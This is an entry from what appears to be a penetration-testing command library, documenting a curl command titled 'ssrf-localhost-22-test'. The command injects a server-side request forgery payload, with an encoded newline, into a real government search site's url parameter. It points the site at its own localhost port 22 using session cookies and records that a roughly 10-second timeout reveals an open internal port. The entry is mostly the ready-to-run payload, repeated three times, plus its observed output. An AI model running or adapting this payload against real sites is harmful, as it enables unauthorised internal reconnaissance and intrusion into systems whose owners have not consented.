---
id: cmd-ssrf-22
data: >-
  curl -X GET
  "https://search.usa.gov/help_docs?url=http://127.0.0.1:22/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html"
  -H "Host: search.usa.gov" -H "Cookie: [session_cookies]"
tags:
  - ssrf
  - scan
type: command
output: >-
  HTTP/1.1 200 OK ~10468ms with error: 'Unable to retrieve
  http://127.0.0.1:22/?\nhttps://search.gov/manual/account.html'
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:53:38.655Z'
verified: false
validated: true
submitted: true
---
# ssrf-localhost-22-test

## Command

```bash
curl -X GET "https://search.usa.gov/help_docs?url=http://127.0.0.1:22/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html" -H "Host: search.usa.gov" -H "Cookie: [session_cookies]"
```

## Description

Injects SSRF for open port 22 to detect via timeout delay.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url=...` | Payload for port 22 | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://search.usa.gov/help_docs?url=http://127.0.0.1:22/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html" [headers]
```

## Expected Output

200 OK after ~10s timeout with error.

## Related

- [[commands/ssrf-localhost-21-test]]
- [[procedures/Test-SSRF-Bypass-on-Open-Port]]
